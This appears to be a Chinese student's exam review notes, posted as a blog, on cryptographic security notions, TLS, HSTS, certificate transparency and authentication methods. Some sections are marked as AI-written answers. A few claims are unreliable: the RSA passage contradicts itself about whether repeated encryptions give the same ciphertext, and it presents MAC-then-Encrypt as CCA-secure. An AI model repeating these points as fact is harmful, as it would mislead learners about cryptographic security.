<p>一个不太明显的关系是，<strong>IND-CPA并不蕴含NM-CPA。但是相反的关系确实成立：NM-CPA蕴含IND-CPA。IND-CCA和NM-CCA是等同的概念，它们各自蕴含彼此。</strong></p>
<h2 id="解释语义安全的概念。实现语义安全的基本思路【随机加密或者概率加密】（P37）"><a href="#解释语义安全的概念。实现语义安全的基本思路【随机加密或者概率加密】（P37）" class="headerlink" title="解释语义安全的概念。实现语义安全的基本思路【随机加密或者概率加密】（P37）"></a>解释语义安全的概念。实现语义安全的基本思路【随机加密或者概率加密】（P37）</h2><p>（1）最重要的安全概念是<strong>IND-CPA</strong>，也称为<strong>语义安全</strong>。从直觉上理解，<strong>只要密钥保密，从密文中就不会泄露任何有关明文的信息。</strong>IND-CPA安全性要求，<strong>对同一明文加密两次，则加密系统必须返回不同的密文。</strong>否则，攻击者可能会从密文发现“明文重复”这一事实，这与密文不应泄露任何信息的定义不符。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/b64733a4-1d92-4ef5-a178-a7bc8748fce8.png" alt="image.png"></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%202.png" alt="image.png"></p>
<p>（2）使用随机加密时，<strong>密文必须比明文略长</strong>，以便每个明文都可以包含多个可能的密文。例如，如果每个明文可以对应264个可能的密文，则密文必须比明文至少长64比特。</p>
<h2 id="4种常见的安全概念（NM-CPA，NM-CCA，IND-CPA和IND-CCA）（P37）"><a href="#4种常见的安全概念（NM-CPA，NM-CCA，IND-CPA和IND-CCA）（P37）" class="headerlink" title="4种常见的安全概念（NM-CPA，NM-CCA，IND-CPA和IND-CCA）（P37）"></a>4种常见的安全概念（NM-CPA，NM-CCA，IND-CPA和IND-CCA）（P37）</h2><ul>
<li><strong>NM-CPA</strong>：<strong>不可展非适应性选择明文攻击安全</strong>。它保证敌手即使能加密任意明文，也无法构造出与已存在密文相关的“新”密文。安全性较弱，实际应用价值有限。</li>
<li><strong>IND-CPA</strong>：<strong>不可区分非适应性选择明文攻击安全</strong>。这是<strong>现代加密最基本、最核心的安全目标</strong>。它保证敌手即使能加密任意明文，也无法区分两个任意明文的加密结果。几乎所有实用公钥方案（如ElGamal, RSA-OAEP）都需达到此安全。</li>
<li><strong>NM-CCA</strong>：<strong>不可展适应性选择密文攻击安全</strong>。是NM-CPA的更强版本，敌手在获得挑战密文后，仍可解密其他密文（但不能解密挑战密文本身）。安全性较强，但不如IND-CCA直观和常用。</li>
<li><strong>IND-CCA</strong>：<strong>不可区分适应性选择密文攻击安全</strong>。这是<strong>实际应用（如标准TLS, PGP）中要求的黄金标准</strong>。它在IND-CPA基础上，允许敌手在获得挑战密文前后，可解密其他任意密文（除挑战密文本身）。这模拟了敌手可进行“密文操纵”并观察解密结果的真实场景。</li>
</ul>
<h2 id="第一个语义安全的密码算法是什么算法？（课件）"><a href="#第一个语义安全的密码算法是什么算法？（课件）" class="headerlink" title="第一个语义安全的密码算法是什么算法？（课件）"></a>第一个语义安全的密码算法是什么算法？（课件）</h2><p>第一个被严格证明在标准模型下达到语义安全（等价于IND-CPA安全）的公钥加密算法是<strong>Goldwasser-Micali加密方案（GM密码算法）</strong>（1982年）。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%203.png" alt="image.png"></p>
<h2 id="ElGamal-密码算法是语义安全的吗？ECC加密算法是语义安全的吗？（P37）"><a href="#ElGamal-密码算法是语义安全的吗？ECC加密算法是语义安全的吗？（P37）" class="headerlink" title="ElGamal 密码算法是语义安全的吗？ECC加密算法是语义安全的吗？（P37）"></a>ElGamal 密码算法是语义安全的吗？ECC加密算法是语义安全的吗？（P37）</h2><p>非对称加密的攻击模型和安全目标与对称加密大致相同，不同之处在于，由于加密密钥是公共密钥，因此任何攻击者都可以使用公共密钥进行加密查询。<strong>Tip：非对称加密的默认模型是选择明文攻击者(CPA)</strong></p>
<p>ElGamal（过程使用随机数，计算共享秘密）：语义安全</p>
<p>ECC：语义安全的密码算法</p>
<h2 id="RSA算法是语义安全的吗？如何使用编码函数提高RSA算法的安全性？（P38）"><a href="#RSA算法是语义安全的吗？如何使用编码函数提高RSA算法的安全性？（P38）" class="headerlink" title="RSA算法是语义安全的吗？如何使用编码函数提高RSA算法的安全性？（P38）"></a>RSA算法是语义安全的吗？如何使用编码函数提高RSA算法的安全性？（P38）</h2><p>（1）RSA密码算法：<strong>不是语义安全的！没有IND，普通RSA每次加密结果相同！对同样的数据，用同样的key进行RSA加密，每次的输出密文都会不一样；</strong>但是这些加密的结果都能正确的解密。</p>
<p>（2）RSA-OAEP：<strong>使用编码函数，引入随机性</strong>；加密前<strong>填充数据</strong>，解密时<strong>检验填充是否正确</strong>；RSA-OAEP是不多的IND-CCA2安全的实用密码体制</p>
<h2 id="AES算法是语义安全的吗？如何构造基于AES算法的语义安全加密方案？（P40）"><a href="#AES算法是语义安全的吗？如何构造基于AES算法的语义安全加密方案？（P40）" class="headerlink" title="AES算法是语义安全的吗？如何构造基于AES算法的语义安全加密方案？（P40）"></a>AES算法是语义安全的吗？如何构造基于AES算法的语义安全加密方案？（P40）</h2><p>分组密码只能加密固定长度的分组，如果需要加密一段并非恰好一个分组长度的数据，就需要使用分组密码工作模式。</p>
<p>常用的工作模式：<strong>ECB，CBC；CFB，OFB，CTR</strong></p>
<p>（1）ECB模式不安全：无法掩盖数据结构，无法抵御CPA，<strong>无法实现语义安全。</strong></p>
<p><strong>⼀个加密算法的明⽂和密⽂⼀样⻓</strong>，请问：该加密算法是语义安全的吗？<strong>否</strong></p>
<p>（2）CBC模式，引入随机性（随机初始向量IV）</p>
<p>（3）CTR模式，用nonce实现随机性。</p>
<p>（4）<strong>OFB、CFB、CBC、CTR都有IND-CPA</strong>，<strong>但是都不是不可塑（NM）的，</strong>无法抵御CCA2。</p>
<p>方法：这需要<strong>使用消息验证码MAC。</strong>将加密和认证结合，这就是<strong>认证加密（AE）</strong>，同时实现保密性+完整性。</p>
<p>为了防止对密文进行修改（密文完整性），我们可以使用**消息验证码(mac)**。对于AES-CBC，我们通常使用HMAC(用于基于哈希的MAC)结合SHA-256哈希函数来提供完整性。</p>
<p><strong>认证加密（AE）的三种方案：</strong></p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%204.png" alt="image.png"></p>
<p>EtM：意味着对CCA的安全性；MtE也可以。其他只有CPA安全性。</p>
<h2 id="理解认证加密方案对安全性的提升的意义（AI版答案）"><a href="#理解认证加密方案对安全性的提升的意义（AI版答案）" class="headerlink" title="理解认证加密方案对安全性的提升的意义（AI版答案）"></a>理解认证加密方案对安全性的提升的意义（AI版答案）</h2><p>认证加密方案是对称密码学的一次重大进步，它将<strong>保密性</strong>和<strong>认证性</strong>两大安全目标整合到一个高效的操作中。其提升意义体现在：</p>
<p><strong>从单一保密到双重保护</strong>：传统加密（如AES-CBC）只确保保密性，无法检测密文是否被篡改。攻击者可以修改密文，接收方解密后得到无意义的乱码但无法识别已被攻击。认证加密（如AES-GCM）同时确保<strong>保密性</strong>和<strong>完整性&#x2F;真实性</strong>，任何对密文的修改都会被立即发现。</p>
<p><strong>抵御更强大的攻击</strong>：在现实网络环境中，攻击者不仅能窃听，还能主动修改、重放、删除或重组密文。认证加密可抵御这类<strong>主动攻击</strong>，包括选择密文攻击、重放攻击等。</p>
<p><strong>简化安全协议设计</strong>：在传统方案中，开发者需要分别实现加密和消息认证码（MAC），容易因设计不当引发严重漏洞（如MAC-then-Encrypt的顺序问题）。认证加密将二者标准化，减少实现错误。</p>
<p><strong>提升效率</strong>：如AES-GCM等认证加密模式在硬件支持下可并行化处理，一次处理即完成加密和认证，比”加密+HMAC”的分离方案更高效。</p>
<p><strong>核心意义</strong>：认证加密代表了从”防窃听”到”防篡改”的安全理念升级，是现代TLS、磁盘加密等实际应用的基础安全保障。</p>
<h2 id="典型案例分析：在工程实践中使用密码算法设计安全技术方案时需要注意的问题（AI版答案）"><a href="#典型案例分析：在工程实践中使用密码算法设计安全技术方案时需要注意的问题（AI版答案）" class="headerlink" title="典型案例分析：在工程实践中使用密码算法设计安全技术方案时需要注意的问题（AI版答案）"></a>典型案例分析：在工程实践中使用密码算法设计安全技术方案时需要注意的问题（AI版答案）</h2><p>在设计安全技术方案时，<strong>算法本身的安全性只是基础，工程实现和系统设计更为关键</strong>。常见问题包括：</p>
<p><strong>（1）误用密码原语</strong>：</p>
<ul>
<li><strong>典型案例</strong>：使用RSA直接加密大文件（超过其密钥长度）、用AES-ECB模式加密结构化数据（导致模式识别攻击）、用哈希函数（如MD5）存储密码（而非专用密码哈希函数）。</li>
<li><strong>注意</strong>：必须理解每种算法的设计目的和限制，选择合适的模式和参数。</li>
</ul>
<p><strong>（2）密钥管理缺陷</strong>：</p>
<ul>
<li><strong>案例</strong>：将密钥硬编码在代码中、密钥生命周期过长、密钥存储不当（如日志文件记录密钥）、密钥派生不使用盐值。</li>
<li><strong>注意</strong>：安全的密钥生成、存储、分发、轮换和销毁是系统工程的核心。应使用密钥管理服务或硬件安全模块。</li>
</ul>
<p><strong>（3）随机数问题</strong>：</p>
<ul>
<li><strong>典型案例</strong>：使用可预测的随机源（如系统时间）生成密钥或初始化向量，或在虚拟环境中使用熵不足的随机数发生器。</li>
<li><strong>注意</strong>：加密操作中的所有随机值必须来自密码学安全的随机数生成器。</li>
</ul>
<p><strong>（4）侧信道攻击</strong>：</p>
<ul>
<li><strong>案例</strong>：AES实现的时间差异泄露密钥信息、加密错误信息的差异（填充预言攻击）、功耗分析。</li>
<li><strong>注意</strong>：必须使用常数时间的实现，防范时序攻击、错误注入攻击等物理层攻击。</li>
</ul>
<p><strong>（5）协议层漏洞</strong>：</p>
<ul>
<li><strong>案例</strong>：在自定义协议中缺少新鲜性验证导致重放攻击、缺乏前向安全性、身份认证与密钥协商分离。</li>
<li><strong>注意</strong>：应优先使用标准化的、经过安全分析的协议（如TLS 1.3），而非自行设计。</li>
</ul>
<p><strong>（6）算法过时与配置错误</strong>：</p>
<ul>
<li><strong>案例</strong>：继续使用已被攻破的算法（如RC4、DES、MD5）、TLS配置中支持弱密码套件、使用短密钥。</li>
<li><strong>注意</strong>：需定期更新密码库，遵循当前的安全最佳实践（如使用AES-256、SHA-256、2048位以上RSA等）。</li>
</ul>
<p><strong>核心原则</strong>：不要自行发明密码算法或协议；使用标准、经过充分审查的库（如OpenSSL、libsodium）；保持最小权限原则和纵深防御；进行第三方安全审计。<strong>系统最弱的一环往往不在算法理论，而在工程实现细节。</strong></p>
<h1 id="数据传输安全"><a href="#数据传输安全" class="headerlink" title="数据传输安全"></a>数据传输安全</h1><h2 id="TLS协议的基本原理：协议架构，报文结构，协议流程（P49）"><a href="#TLS协议的基本原理：协议架构，报文结构，协议流程（P49）" class="headerlink" title="TLS协议的基本原理：协议架构，报文结构，协议流程（P49）"></a>TLS协议的基本原理：协议架构，报文结构，协议流程（P49）</h2><p>TLS（传输层安全）协议工作在OSI模型中的<strong>传输层和应用层</strong>之间，用于在两个通信应用程序之间<strong>提供机密性和数据完整性</strong>。</p>
<p>（1）TLS协议可分为<strong>握手协议和记录协议</strong>：握手协议负责<strong>密码组件的协商</strong>以及<strong>安全信道的建立；</strong>记录协议则是<strong>在已建立的安全信道中传输秘密信息</strong>。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%205.png" alt="image.png"></p>
<p>TLS 定义了四个核心子协议<strong>：密钥规格变更协议，警报协议，握手协议，应用数据协议</strong></p>
<p><strong>握手协议</strong>的任务：<strong>协商密钥规格；利用公钥证书来认证服务器的身份；生成会话密钥。</strong></p>
<p>（2）报文结构：Header(Type, Version, Length) + Data</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%206.png" alt="image.png"></p>
<p>（3）协议流程：<strong>握手阶段、安全通信阶段。</strong></p>
<p><strong>Q：网站已经使用TLS，那为什么没有在整个互联网上使用mTLS（双向TLS，mutual-tls）？</strong></p>
<p>对于日常用途，单向身份验证提供了足够的保护。公共互联网上TLS的目标是：（1）确保人们不会访问欺骗性网站；（2）确保私有数据在通过包含互联网的各种网络时安全且加密，以及；（3）确保数据在传输过程中没有改变。<strong>客户端仅验证服务器身份的单向TLS足以实现这些目标。</strong></p>
<p><strong>Q：客户端证书为什么没有被广泛使用？</strong></p>
<p>（1）增加安全性成本，用户<strong>隐私泄漏</strong>：账号的匿名性；（2）<strong>客户端证书管理</strong>：将TLS证书分发到所有最终用户设备将非常困难。生成、管理和验证为此所需的数十亿证书几乎是不可能的任务。</p>
<h2 id="TLS握手协议的安全性分析与改进方案：前向安全性，中间人攻击，重放攻击（P53）"><a href="#TLS握手协议的安全性分析与改进方案：前向安全性，中间人攻击，重放攻击（P53）" class="headerlink" title="TLS握手协议的安全性分析与改进方案：前向安全性，中间人攻击，重放攻击（P53）"></a>TLS握手协议的安全性分析与改进方案：前向安全性，中间人攻击，重放攻击（P53）</h2><p>（1）<strong>重放攻击：</strong>在握手时使用Client Random和Server Random，<strong>防止连接重放。</strong>黑客在嗅探了服务器与客户端之间的所有报文后，可以再次冒充客户端向服务器发送相同的报文（虽然黑客不知道内容是什么），因为报文信息都是之前客户端和服务器验证过的，因此服务器会认为是客户端与其通信，导致又一次连接。</p>
<p>（2）<strong>前向安全性</strong>：是密码学中通信协议的安全属性，<strong>是指长期使用的主密钥泄漏不会导致过去的会话密钥泄漏。</strong>通俗来说，前向安全指的是密钥泄漏也不会让之前加密的数据被泄漏，影响的只有当前，对之前的数据无影响。即使有人记录流量并危及服务器以获得其私钥，他们也无法破译该流量。<strong>可以采用DHE密钥交换协议，支持前向安全性，目前大部分HTTPS流量用的都是ECDHE密钥交换</strong></p>
<p>（3）<strong>中间人攻击：</strong>DHE无法抵御中间人攻击。攻击者<strong>只需要冒充连接双方并执行两次单独的密钥交换</strong>即可实现攻击。解决方法是服务器发送服务器端DH参数时，需要对服务器端DH参数进行数字签名，证明服务器的身份。</p>
<h2 id="TLS协议在实际部署中的安全性问题分析：HSTS（P61）证书安全（P65）CDN（P71）"><a href="#TLS协议在实际部署中的安全性问题分析：HSTS（P61）证书安全（P65）CDN（P71）" class="headerlink" title="TLS协议在实际部署中的安全性问题分析：HSTS（P61）证书安全（P65）CDN（P71）"></a>TLS协议在实际部署中的安全性问题分析：HSTS（P61）证书安全（P65）CDN（P71）</h2><p>（1）HSTS：是国际互联网工程组织IETF发布的一种<strong>互联网安全策略机制</strong>。采用HSTS策略的网站将保证浏览器始终连接到该网站的HTTPS加密版本，不需要用户手动在URL地址栏中输入加密地址，以减少会话劫持风险。</p>
<p>虽然HSTS可以很好的解决HTTPS降级攻击，但是<strong>对于HSTS生效前的首次HTTP请求，依然无法避免被劫持。提出了HSTS Preload List方案</strong>：内置一份可以定期更新的列表，对于列表中的域名，即使用户之前没有访问过，也会使用HTTPS协议。</p>
<p>（2）证书安全：使用工具Certbot配置SSL安全证书，每60天更新证书。自动证书管理环境（ACME），<strong>一种通信协议，用于自动化证书颁发机构与其用户的web服务器之间的交互，允许以非常低的成本自动部署公钥基础设施；</strong></p>
<p>（3）CDN：<strong>内容分发网络，是一种分布式基础设施，可以有效地向最终用户提供网站的内容</strong>。一个client和server之间的“中间商”。 </p>
<h2 id="HSTS的preload-list方案是为了解决什么问题？（P61-课件）"><a href="#HSTS的preload-list方案是为了解决什么问题？（P61-课件）" class="headerlink" title="HSTS的preload list方案是为了解决什么问题？（P61+课件）"></a>HSTS的preload list方案是为了解决什么问题？（P61+课件）</h2><p>采用HSTS策略的网站将保证浏览器始终连接到该网站的HTTPS加密版本，不需要用户手动在URL地址栏中输入加密地址，以减少会话劫持风险。虽然HSTS可以很好的解决HTTPS降级攻击，但是<strong>对于HSTS生效前的首次HTTP请求，依然无法避免被劫持。</strong></p>
<h2 id="TLS-1-3如何对抗降级攻击？如何对抗流量分析攻击？（P61）"><a href="#TLS-1-3如何对抗降级攻击？如何对抗流量分析攻击？（P61）" class="headerlink" title="TLS 1.3如何对抗降级攻击？如何对抗流量分析攻击？（P61）"></a>TLS 1.3如何对抗降级攻击？如何对抗流量分析攻击？（P61）</h2><p>（1）TLS 1.3的<strong>降级保护特性</strong>被设计为抵御降级攻击，其中<strong>攻击者迫使客户端和服务器使用比1.3更弱版本的TLS</strong>。为了执行降级攻击，攻击者通过<strong>拦截和修改ClientHello消息</strong>以告诉服务器客户端不支持TLS 1.3，<strong>迫使服务器选择较弱版本的TLS，</strong>从而其可以利用较早版本的TLS中的漏洞。</p>
<p>为了抵御降级攻击，TLS 1.3服务器在ServerHello消息中<strong>发送的32字节随机值中使用三种模式来标识请求的连接类型</strong>。该模式应与客户端对特定类型TLS连接的请求相匹配。如果客户端接收到错误的模式，它就知道某些事情正在发生。</p>
<p>（2）TLS 1.3记录支持一个很好的特性，称为<strong>零填充，其减轻了流量分析攻击</strong>。流量分析是一种攻击者<strong>使用定时、数据传输量等从流量模式中提取信息的方法。</strong>例如，因为密文与明文的大小大致相同，所以即使使用强加密，攻击者也可以通过查看其密文的长度来确定消息的大致大小。<strong>零填充向明文添加零</strong>，以扩大密文的大小，从而迷惑观察者使其认为加密的消息比实际长度长。</p>
<h2 id="TLS-1-3对性能做了哪些提高和改进？（P59）"><a href="#TLS-1-3对性能做了哪些提高和改进？（P59）" class="headerlink" title="TLS 1.3对性能做了哪些提高和改进？（P59）"></a>TLS 1.3对性能做了哪些提高和改进？（P59）</h2><p><strong>性能</strong>（单次往返握手和会话恢复）：通过<strong>同时进行协商算法和密钥交换</strong>来优化密钥交换流程。大幅度减少了密钥协商算法套件，淘汰了大量安全性、性能不好的算法，仅支持5种密钥套件。</p>
<p>会话恢复是指<strong>重新使用旧的会话或连接中的秘密值</strong>。这是一种<strong>利用在前一个会话中客户端和服务器之间交换的预共享密钥</strong>来引导新会话的方法。会话恢复带来了两个主要好处：<strong>客户端可以立即开始加密，并且不需要在后续的会话中使用证书。</strong></p>
<p><strong>安全（降级保护）；隐私（零填充，对抗流量分析）</strong></p>
<h2 id="QUIC协议的特点（P78）"><a href="#QUIC协议的特点（P78）" class="headerlink" title="QUIC协议的特点（P78）"></a>QUIC协议的特点（P78）</h2><p>QUIC是谷歌制定的一种基于UDP的低时延的<strong>互联网传输层协议</strong>。UDP往往效率更高（不经常跟服务器端通信查看数据包是否送达或者按序），但是可靠性比不上TCP。QUIC很好地解决了当今传输层和应用层面临的各种需求，<strong>包括处理更多的连接，安全性，和低延迟</strong>。<strong>QUIC融合了包括TCP，TLS，HTTP&#x2F;2等协议的特性，但基于UDP传输。</strong></p>
<p><strong>（1）QUIC的一个主要目标就是减少连接延迟，</strong>当客户端第一次连接服务器时，QUIC只需要1RTT（Round-Trip Time）的延迟就可以建立可靠安全的连接,相对于TCP+TLS的1-3次RTT要更加快捷。之后客户端可以在本地缓存加密的认证信息，在再次与服务器建立连接时可以实现0-RTT的连接建立延迟。</p>
<p><strong>（2）QUIC同时复用了HTTP&#x2F;2协议的多路复用功能（Multiplexing），</strong>但由于QUIC基于UDP所以避免了HTTP&#x2F;2的线头阻塞（Head-of-Line Blocking）问题。</p>
<p><strong>（3）因为QUIC基于UDP，</strong>运行在用户态而不是系统内核，使得QUIC协议可以快速的更新和部署，从而很好地解决了TCP协议部署及更新的困难。</p>
<h2 id="浏览器如何鉴别所访问网站证书的真伪？攻击者常用的欺骗手段有哪些？（P64-课件）"><a href="#浏览器如何鉴别所访问网站证书的真伪？攻击者常用的欺骗手段有哪些？（P64-课件）" class="headerlink" title="浏览器如何鉴别所访问网站证书的真伪？攻击者常用的欺骗手段有哪些？（P64+课件）"></a>浏览器如何鉴别所访问网站证书的真伪？攻击者常用的欺骗手段有哪些？（P64+课件）</h2><p>（1）HTTPS网站的身份认证是<strong>通过证书信任链完成的</strong>，浏览器<strong>从站点证书开始递归校验父证书</strong>，直至出现信任的根证书（根证书列表一般内置于操作系统，Firefox则自己维护）。</p>
<p>（2）伪造的方式：<strong>CA错误签发证书。</strong>例如，<strong>CA被欺骗</strong>、<strong>被入侵或者被贿赂</strong>。<strong>破解弱密钥算法。</strong>受信任的CA（证书颁发机构）有好几百个，他们成为整个网站身份认证过程中一个较大的攻击面。现有的证书信任链机制最大的问题是，<strong>任何一家受信任的CA都可以签发任意网站的站点证书，</strong>这些证书在浏览器看来，都是合法的。实际上，目前由于CA失误导致错误签发证书；以及个别CA出于某些目的（如监控加密流量）故意向第三方随意签发证书这两种情况时有发生。</p>
<h2 id="ACME协议的工作原理（P66）"><a href="#ACME协议的工作原理（P66）" class="headerlink" title="ACME协议的工作原理（P66）"></a>ACME协议的工作原理（P66）</h2><p>自动证书管理环境(ACME)协议是一种通信协议，<strong>用于自动化证书颁发机构与其用户的web服务器之间的交互</strong>，允许<strong>以非常低的成本自动部署公钥基础设施</strong>。有两个关键部分：<strong>ACME客户端，ACME服务端</strong>。</p>
<p>首先，ACME客户端生成一个密钥对，向CA发送账户注册请求，并在这个请求中提供公钥，使用生成的私钥对其签名。接下来，ACME客户端向CA发送证书请求，提供所申请证书包含的标识符列表（例如域名）。CA生成随机指令，并向ACME客户端发送指令和客户端可以完成的挑战列表来证明标识符的所有权。客户端选择一个HTTP挑战，并创建包含指令的文件，将其托管在“&#x2F;wellknown&#x2F;acme challenge&#x2F;<token>”目录下。ACME客户端通知CA挑战完成后，CA验证该文件是否可访问。当所有的标识符都验证完毕，客户端发送证书签名请求，CA颁发证书。</p>
<h2 id="证书透明化（伪造证书解决方法之一，P68）"><a href="#证书透明化（伪造证书解决方法之一，P68）" class="headerlink" title="证书透明化（伪造证书解决方法之一，P68）"></a>证书透明化（伪造证书解决方法之一，P68）</h2><p>（1）CT：CA要被监督。证书透明度（CT）目的是通过<strong>保持所有服务器证书的公开透明</strong>来改进互联网PKI。它的基本想法是<strong>CA将每一张证书都提交给一组公开的日志服务器</strong>，反过来，这些CA将收到提交的证明，<strong>称为已签名证书时间戳（SCT）</strong>，并中继给最终用户。</p>
<p>为了检测欺诈性的TLS服务器证书并提高证书颁发机构（CA）的责任，建议使用<strong>证书透明性（CT）</strong>将证书记录在公开可见的日志中，<strong>监控程序从中获取所有证书并监视可疑证书。</strong></p>
<p>（2）PKP：网站可以选择可靠的CA；HPKP 技术给予我们主动选择信任CA的权利。</p>
<h2 id="公钥钉扎（伪造证书解决方法之一，P69）"><a href="#公钥钉扎（伪造证书解决方法之一，P69）" class="headerlink" title="公钥钉扎（伪造证书解决方法之一，P69）"></a>公钥钉扎（伪造证书解决方法之一，P69）</h2><p>（HPKP）：白名单公钥用来防范<strong>由伪造或不正当手段获得网站证书</strong>造成的中间人攻击，但有着与CT不同的思路。</p>
<p>HPKP技术<strong>给予我们主动选择信任CA的权利</strong>。它的工作原理是<strong>通过响应头或者<meta>标签</strong>告诉浏览器当前网站的证书指纹，以及过期时间等其它信息。未来一段时间内，浏览器<strong>再次访问这个网站必须验证证书链中的证书指纹</strong>，如果跟之前指定的值不匹配，即便证书本身是合法的，也必须断开连接。</p>
<h2 id="数据传输安全协议设计的重点与常用技巧（AI版答案）"><a href="#数据传输安全协议设计的重点与常用技巧（AI版答案）" class="headerlink" title="数据传输安全协议设计的重点与常用技巧（AI版答案）"></a>数据传输安全协议设计的重点与常用技巧（AI版答案）</h2><p>（1）设计重点</p>
<p><strong>机密性</strong>：确保传输内容不被窃听，通过加密算法（如 AES、ChaCha20）实现。</p>
<p><strong>完整性</strong>：防止数据在传输中被篡改，通常通过消息认证码（如 HMAC）或认证加密模式（如 AES-GCM）实现。</p>
<p><strong>身份认证</strong>：验证通信双方的身份，防止中间人攻击，可通过数字证书、预共享密钥等方式实现。</p>
<p><strong>前向安全性</strong>：即使长期私钥泄露，过去的会话密钥也不会被破解，通常通过迪菲-赫尔曼密钥交换实现。</p>
<p><strong>抗重放攻击</strong>：确保同一数据包不被重复使用，通过序列号、时间戳或随机数实现。</p>
<p><strong>协议版本与算法协商</strong>：支持灵活的算法升级与版本管理，防止降级攻击。</p>
<p>（2）常用技巧</p>
<p><strong>分层与模块化设计</strong>：如 TLS 分为记录层和握手层，记录层处理加密传输，握手层管理密钥协商与认证，便于独立升级与维护。</p>
<p><strong>密钥交换与密钥派生分离</strong>：先通过迪菲-赫尔曼（ECDHE）等交换临时密钥，再通过密钥派生函数（如 HKDF）生成会话密钥，增强前向安全性。</p>
<p><strong>加密与认证结合</strong>：优先选用认证加密模式（如 AES-GCM、ChaCha20-Poly1305），一次性完成加密和认证，简化实现并提升性能。</p>
<p><strong>证书链与信任锚</strong>：使用公钥基础设施（PKI）和受信任的根证书颁发机构（CA）验证身份，支持证书吊销列表（CRL）或 OCSP 检查证书状态。</p>
<p><strong>会话恢复机制</strong>：通过会话票据（Session Ticket）或会话 ID 复用已协商的密钥材料，减少重复握手开销，提升性能。</p>
<p><strong>防御降级攻击</strong>：在握手阶段记录支持的算法和版本，并在最终消息中用密钥计算验证，防止攻击者强制协商弱算法。</p>
<p><strong>心跳与连接保活</strong>：通过心跳机制（如 TLS Heartbeat）维持连接活跃，同时防范如 Heartbleed 类的信息泄露漏洞。</p>
<p><strong>混淆与填充</strong>：在可能的情况下对数据包长度和发送时机进行填充或混淆，防止流量分析攻击。</p>
<p>（3）典型案例技巧</p>
<p><strong>TLS 1.3 的简化与强化</strong>：移除弱算法和不安全特性（如静态 RSA 密钥交换），强制前向安全，将握手从 2-RTT 优化为 1-RTT 甚至 0-RTT（有条件的）。</p>
<p><strong>抗量子计算的准备</strong>：引入混合密钥交换（如 X25519 + Kyber），在经典安全基础上增加抗量子攻击层。</p>
<p><strong>核心原则</strong>：安全协议设计需在安全、性能和可部署性之间取得平衡，遵循“永不自己发明密码学”原则，优先采用标准化、经过充分分析的协议框架，并通过形式化验证和公开审计确保实现无误。</p>
<h1 id="数据访问控制：身份认证与身份管理"><a href="#数据访问控制：身份认证与身份管理" class="headerlink" title="数据访问控制：身份认证与身份管理"></a>数据访问控制：身份认证与身份管理</h1><p><strong>Q：TLS客户端证书为什么没有被广泛使用？（P94）</strong></p>
<p>客户端的证书消息在加密完成之前被发送；因此，客户端证书的内容对被动网络攻击者（网络窃听）是可用的。CA签发给自然人的证书通常至少包含一个人的姓名和个人身份代码。即使证书不包含任何个人数据，被动网络攻击者也可以使用证书中的公钥跟踪客户端。因为私钥和证书管理方面存在困难。</p>
<p><strong>应用层客户端证书：先建立TLS连接，然后在安全的信道上传输客户端证书</strong>。</p>
<p><strong>Q：私钥如何安全管理？</strong>安全硬件（例如，智能卡，USBKey）</p>
<p>实名还是匿名？如何适配多个服务？每个服务一个私钥，还是一个私钥多个服务（eID）</p>
<h2 id="从用户视角，对身份认证方法的分类（P85）"><a href="#从用户视角，对身份认证方法的分类（P85）" class="headerlink" title="从用户视角，对身份认证方法的分类（P85）"></a>从用户视角，对身份认证方法的分类（P85）</h2><p>（1）知道什么（Something you know）：例如，用户名和口令。</p>
<p>（2）拥有什么（Something you have）：比如，你在ATM机器上取款时不仅需要知道口令，还需要携带银行卡；再比如，USB Key，一次性口令（OTP） 硬件，一次性口令软件令牌（Token），手机号码（SIM卡）。</p>
<p>（3）你是谁（Who you are）：<strong>基于生物特征的身份认证</strong>，例如，指纹、掌纹、虹膜、语音、人脸等。</p>
<h2 id="从技术视角，对身份认证方法的分类（P85）"><a href="#从技术视角，对身份认证方法的分类（P85）" class="headerlink" title="从技术视角，对身份认证方法的分类（P85）"></a>从技术视角，对身份认证方法的分类（P85）</h2><p>按对称性和非对称性分为两类。</p>
<p><strong>一类是对称密钥认证体系</strong>，客户端和服务器拥有共同的密钥，应用实例包括密码、短信验证码、OTP动态令牌和传统的生物识别认证方案等</p>
<p><strong>另一类是公私钥对认证体系</strong>，客户端和服务器拥有非对称的密钥，应用实例包括智能卡、USB Key、电子身份证（elD）、FIDO协议和aPAKE协议等。</p>
<h2 id="了解四种基本的身份认证方法及其面临的安全威胁（P85）"><a href="#了解四种基本的身份认证方法及其面临的安全威胁（P85）" class="headerlink" title="了解四种基本的身份认证方法及其面临的安全威胁（P85）"></a>了解四种基本的身份认证方法及其面临的安全威胁（P85）</h2><p>（1）口令</p>
<p>（2）安全令牌：一次性密码（OTP，onetimepassword）</p>
<p>（3）生物信息：<strong>无需记忆；不能改变</strong>【被窃取后，身份仿冒】</p>
<p>（4）公钥（证书）：<strong>安全性高。</strong>例如，银行的U盾，电子身份证eID。管理复杂：证书分发，取消，更新等。风险：数字证书和私钥设备遗失【被盗取】；CA中心被入侵【仿冒证书】。</p>
<h2 id="如何评估口令的安全性？掌握量化分析方法。（P85）"><a href="#如何评估口令的安全性？掌握量化分析方法。（P85）" class="headerlink" title="如何评估口令的安全性？掌握量化分析方法。（P85）"></a>如何评估口令的安全性？掌握量化分析方法。（P85）</h2><p>量化分析：使用Key Entropy对口令进行等效的密钥安全强度计算。</p>
<p><strong>Q：多长的口令才有可能能够达到128位安全强度？</strong>口令长度至少21</p>
